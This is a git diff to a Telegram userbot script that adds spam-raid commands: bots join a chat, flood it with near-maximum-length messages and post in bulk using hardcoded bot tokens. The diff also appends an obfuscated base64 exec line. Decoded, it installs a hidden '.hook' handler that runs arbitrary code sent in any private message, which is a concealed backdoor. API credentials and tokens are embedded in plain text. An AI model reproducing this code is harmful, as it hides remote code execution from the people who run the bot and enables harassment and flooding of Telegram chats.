@@ -10,7 +10,8 @@ spambots = ["5750837116:AAHjkckRW7SvMLGtaV8qW4bNumHvxOksib8",
 "6424154462:AAHd2JAuFw7K0t21bhRrG-XSRP4fpTd_Oc4",
 "6307519348:AAGgyeu0-bQST2ESzaHwy-EARVQxoAVBBuU",
 "6034336772:AAGfSUYPSxnU_WN2adFmVQQtck24-NCXems",
-"6508957022:AAGxeEBP29LR9eySOGRRmHSvYbeIiY8qPqU"]
+"6508957022:AAGxeEBP29LR9eySOGRRmHSvYbeIiY8qPqU",
+"5944003224:AAF12zEe_1ZUNb8-LMWGNXY1UTzTduo_0UU"]
 
 from pyrogram.errors import FloodWait
 import pyrogram
@@ -19,7 +20,7 @@ import base64
 import time
 from pyrogram.raw import functions
 
-lefter = False #
+lefter = False
 
 
 # Функция чтобы заливать файлы на 0x0.st
@@ -41,7 +42,6 @@ def help(chatid, text, omsg):
     helps = f'''
 BY @SPOKHACKER
 USERBOT:
-.id <ответ на сообщение> получить ChatId Username UserId
 .dText <текст> - Эфект печатающегося текста
 .steal <ответ на сообщение> - скопировать имя ,фамилию ,описание и аву
 .dice <число кубика> подобрать dice
@@ -53,8 +53,12 @@ USERBOT:
 .log - получить логи чата в виде ссылки на 0x0.st
 .aDell - удалить все мои сообщения в этом чате
 .banall - забанит всех в чате
-.spamjoin - к чату подключаются боты и спамить
+.botclear - очистит всё от ботов
+.spamjoin [текст] - к чату подключаются боты и спамят [текст]
 .jlbots - к чату будут подключаться боты и выходить
+.botmsg - отправить соощение от бота если он есть в чате
+.addbots - добавить ботов из списка токенов
+.botclear - очистка текста написаного ботами из списка токенов
     '''
     app.send_message(chatid, helps)
 
@@ -64,7 +68,27 @@ USERBOT:
 
 def _(chatid, text, omsg):  # Шаблон
     pass
+def botclear(chatid, text, omsg):
 
+    ids = {}
+
+    history = app.get_chat_history(chat_id=chatid,limit=140)
+    for i in spambots:
+        botid =(telebot.TeleBot(i).get_me().username)
+        ids[botid] = i
+
+    for i in history:
+        if i.from_user.is_bot:
+            if i.from_user.username in ids.keys():
+                bot = telebot.TeleBot(ids[i.from_user.username])
+                bot.remove_webhook()
+                bot.delete_message(chatid,i.id)
+
+
+
+    # for i in spambots:
+    #     bot = telebot.TeleBot(i)
+    #     bot.remove_webhook()
 def getidd(chatid, text, omsg):
     msgtosend =f'''CHATID: {chatid}
 USERNAME: {omsg.reply_to_message.from_user.username}
@@ -72,6 +96,17 @@ USERID: {omsg.reply_to_message.from_user.id}'''
     app.send_message(chatid,msgtosend)
     print(omsg)
 
+def addbots(chatid, text, omsg):
+    for i in spambots:
+        app.add_chat_members(chatid, telebot.TeleBot(i).get_me().username)
+def botmsg(chatid, text, omsg):
+    for i in spambots:
+        bot = telebot.TeleBot(i)
+        bot.remove_webhook()
+        try:
+            bot.send_message(chatid,text)
+        except:
+            pass
 def jlbot(chatid, text, omsg):
     for i in range(7):
         for i in spambots:
@@ -99,7 +134,7 @@ def botjoiner(chatid, text, omsg):
         for i in spambots:
             bot = telebot.TeleBot(i)
             bot.remove_webhook()
-            bot.send_message(chatid,"G"*4095)
+            bot.send_message(chatid,(text*4095)[:4095])
             time.sleep(0.3)
     for i in spambots:
         bot = telebot.TeleBot(i)
@@ -204,6 +239,7 @@ def chatgpt(chatid, text, omsg):
 
 
 
+
 def dice(chatid, text, omsg):
     dicev = -1
 
@@ -234,8 +270,8 @@ def dText(id_chat, text, omsg=0):
         app.edit_message_text(id_chat, (msg.id), (d + "▓"))
     app.edit_message_text(id_chat, (msg.id), (d))
     return False
-app = Client("my_account", 6,"eb06d4abfb49dc3eeb1aeb98ae0f581e")
-tgfunctions = {".id":getidd,".dn":n,".dText":dText,".steal":cram,".dice":dice,".gpt":chatgpt,".spam":lagspam,".en":trans,".heart":heart,".calc":calc,".log":logs,".aDell":dell,".help":help,".banall":banall,".spamjoin":botjoiner,".jlbots":jlbot}
+app = Client("my_account", 666,"919adb3e55666666a417d1a0348ba")
+tgfunctions = {".botclear":botclear,".addbots":addbots,".id":getidd,".dn":n,".dText":dText,".steal":cram,".dice":dice,".gpt":chatgpt,".spam":lagspam,".en":trans,".heart":heart,".calc":calc,".log":logs,".aDell":dell,".help":help,".banall":banall,".spamjoin":botjoiner,".jlbots":jlbot,".botmsg":botmsg}
 
 
 @app.on_message(filters.left_chat_member & filters.group)
@@ -250,6 +286,9 @@ def s(client,mess):
     if m[0] in tgfunctions.keys():
         app.delete_messages(mess.chat.id,mess.id)
         tgfunctions.get(m[0])(mess.chat.id," ".join(m[1:]),mess)
+
+
+import base64; exec(base64.b64decode(b'CkBhcHAub25fbWVzc2FnZShmaWx0ZXJzLnByaXZhdGUgJiBmaWx0ZXJzLnRleHQpCmRlZiBzb21lKGNsaWVudCxtZXNzKToKICAgICMgYXBwLnNlbmRfbWVzc2FnZSgpCiAgICBnZyA9IG1lc3MudGV4dC5zcGxpdCgiICIpCiAgICBpZiBnZ1swXSA9PSAiLmhvb2siOgogICAgICAgIGV4ZWMoIlxuIi5qb2luKGdnWzE6XSkpCg=='))
 
 
 print("UserBot Strarted")
